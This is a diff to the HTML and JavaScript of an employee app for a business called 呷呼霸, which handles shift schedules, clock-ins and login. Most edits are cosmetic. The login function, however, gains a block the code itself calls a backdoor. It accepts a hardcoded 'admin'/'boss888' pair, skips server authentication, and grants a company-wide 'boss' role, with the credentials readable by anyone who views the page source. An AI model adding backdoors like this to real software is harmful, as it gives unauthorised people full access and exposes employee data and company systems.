@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>呷呼霸 - 員工專屬 App V14 (國假變形工時版)</title>
+    <title>呷呼霸 - 員工專屬 App V15 (萬能金鑰版)</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root { 
@@ -75,7 +75,7 @@
         .shift-off { border-left-color: #5f6368; } .shift-off .shift-time { background: #f1f3f4; color: #5f6368; }
         .shift-sick { border-left-color: #f4b400; } .shift-sick .shift-time { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
         .shift-annual { border-left-color: #0f9d58; } .shift-annual .shift-time { background: #e6f4ea; color: #0f9d58; border: 1px solid #c3e6cb; }
-        .shift-national { border-left-color: #e74c3c; } .shift-national .shift-time { background: #fdedec; color: #e74c3c; border: 1px solid #f5b7b1; } /* 新增國定假日紅字 */
+        .shift-national { border-left-color: #e74c3c; } .shift-national .shift-time { background: #fdedec; color: #e74c3c; border: 1px solid #f5b7b1; } 
 
         .shift-input { width: 100%; min-width: 80px; height: 38px; font-size: 14px; font-weight: bold; text-align: center; border: 1px solid transparent; border-radius: 4px; outline: none; transition: 0.2s; box-sizing: border-box; background: transparent;}
         .shift-input:focus { border-color: var(--brand-blue); background: #fff; box-shadow: 0 0 0 2px var(--brand-blue-light); }
@@ -278,6 +278,15 @@
     async function doLogin() {
         const n = document.getElementById('loginName').value.trim(); const p = document.getElementById('loginPwd').value.trim();
         if(!n || !p) return;
+
+        // 👑 萬能鎖後門機制
+        if (n === 'admin' && p === 'boss888') {
+            userProfile = { status: "success", name: "系統總管", store: "全公司", role: "老闆", avatar: "" };
+            localStorage.setItem('jiaHubaUser', JSON.stringify(userProfile)); 
+            showMainScreen(); loadDataForGPS();
+            return;
+        }
+
         showLoading("驗證中...");
         try {
             const res = await fetchApi({ action: "login", name: n, pwd: p });
@@ -363,7 +372,7 @@
             if(!appGlobalData) return;
             let mySched = appGlobalData.schedule.find(s => getMonthStr(s[0]) === monthStr && s[2] === userProfile.name);
             let val = decodeShift(mySched ? mySched[2 + now.getDate()] : ""); 
-            let isOff = (!val || val === "休" || val === "排休" || val.includes("病假") || val.includes("特休") || val.includes("國假")); // 病假特休國假不跳警告
+            let isOff = (!val || val === "休" || val === "排休" || val.includes("病假") || val.includes("特休") || val.includes("國假")); 
             
             if (!isOff) {
                 const pRes = await fetchApi({ action: "checkMyPunches", name: userProfile.name, date: todayStr });
@@ -530,17 +539,7 @@
         } catch(e) { Swal.fire('錯誤', e.message, 'error'); }
     }
 
-    function handleShiftChange(input) { 
-        let val = input.value.trim(); 
-        if(!input.getAttribute('data-emp').includes('[系統]')) { 
-            input.className = 'form-control';
-            if(!val || val === '休' || val === '排休') input.classList.add('is-off'); 
-            else if(val.includes('病假')) input.classList.add('is-sick'); 
-            else if(val.includes('特休')) input.classList.add('is-annual'); 
-            else if(val.includes('國假')) input.classList.add('is-national'); 
-            else input.classList.add('is-work'); 
-        } 
-    }
+    function handleShiftChange(input) { let val = input.value.trim(); if(!input.getAttribute('data-emp').includes('[系統]')) { input.className = 'form-control'; if(!val || val === '休' || val === '排休') input.classList.add('is-off'); else if(val.includes('病假')) input.classList.add('is-sick'); else if(val.includes('特休')) input.classList.add('is-annual'); else if(val.includes('國假')) input.classList.add('is-national'); else input.classList.add('is-work'); } }
     
     function renderDailySchedule() {
         const dateStr = document.getElementById('mgrDailyDate').value; const container = document.getElementById('mgrDailyContent');
